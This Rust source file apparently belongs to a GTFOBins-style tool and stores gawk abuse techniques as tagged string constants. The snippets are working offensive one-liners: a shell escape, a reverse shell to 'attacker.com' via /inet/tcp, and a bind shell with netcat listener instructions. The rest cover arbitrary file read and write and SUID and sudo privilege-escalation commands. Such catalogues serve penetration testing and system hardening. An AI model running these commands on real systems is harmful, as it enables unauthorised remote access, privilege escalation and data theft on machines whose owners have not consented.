pub static BIN_NAME: &'static str = "gawk";
pub static SH_CODE: &'static str = r#"

    gawk 'BEGIN {system("/bin/sh")}'
"#;
pub static NIRS_DESC: &'static str =
    "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static NIRS_CODE: &'static str = r#"
	
    RHOST=attacker.com
    RPORT=12345
    gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
        s = "/inet/tcp/0/" RHOST "/" RPORT;
        while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
        while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
"#;
pub static NIBS_DESC: &'static str =
    "Run `nc target.com 12345` on the attacker box to connect to the shell.";
pub static NIBS_CODE: &'static str = r#"
	
    LPORT=12345
    gawk -v LPORT=$LPORT 'BEGIN {
        s = "/inet/tcp/" LPORT "/0/0";
        while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
        while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
"#;
pub static FW_CODE: &'static str = r#"
	
    LFILE=file_to_write
    gawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
"#;
pub static FR_CODE: &'static str = r#"
	
    LFILE=file_to_read
    gawk '//' "$LFILE"
"#;
pub static SUID_CODE: &'static str = r#"
	
    sudo install -m =xs $(which gawk) .

    LFILE=file_to_read
    ./gawk '//' "$LFILE"
"#;
pub static SUDO_CODE: &'static str = r#"
	
    sudo gawk 'BEGIN {system("/bin/sh")}'
"#;
pub static LSUID_CODE: &'static str = r#"
	
    sudo install -m =xs $(which gawk) .

    ./gawk 'BEGIN {system("/bin/sh")}'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static NIRS: Code<'static> = Code {
    title: "NIRS_CODE",
    code: NIRS_CODE,
    tag: Tag::NIRS,
};
pub static NIBS: Code<'static> = Code {
    title: "NIBS_CODE",
    code: NIBS_CODE,
    tag: Tag::NIBS,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
